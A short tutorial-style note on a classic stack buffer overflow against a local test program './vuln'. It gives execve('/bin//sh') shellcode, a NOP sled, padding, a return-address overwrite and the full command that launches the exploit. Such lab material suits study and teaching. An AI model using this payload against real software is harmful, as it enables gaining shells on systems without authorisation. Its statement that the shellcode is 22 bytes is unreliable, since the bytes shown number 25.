This is the most basic way to start up a shell...

shellcode: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

This was to find the memory location of the code
Address: 0xbffff048 of ebp at this point
Address of start of stack 0xbfffefdc

The payload is quite complicated... But, here it goes! First, the \x90 is used for NOP, or no operations, to allow us to use a somewhat accurate memory spot. The next part is the shell code itself, clearly, which is 22 bytes. Now, there is 40 NOPs and 22 or bytes. Because the size of the buffer + ebp is 112, we need to have 112 characters on the stack then overwrite the return address. So, we add 47 more characters to get us to the 112 (the A doesn't matter, could have been anything else). Finally, the return address is put into the middle of the NOPs. This will give us a shell!

\xdc\xef\xff\xbf
./vuln $(python -c 'print "\x90"*40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*47 + "\xdc\xef\xff\xbf"')
